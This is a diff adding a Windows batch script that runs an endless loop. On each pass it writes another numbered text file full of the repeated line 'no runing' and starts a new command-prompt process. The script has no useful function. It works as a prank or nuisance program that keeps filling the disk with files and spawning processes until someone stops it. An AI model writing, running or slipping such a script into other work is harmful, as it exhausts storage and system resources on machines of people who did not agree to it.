@@ -1,0 +1,58 @@
+@echo off
+set no=1
+set run=1
+:top
+(
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+echo no runing
+) > %no%.txt
+set /a no+=%run%
+
+start cmd /K "exit"
+goto top
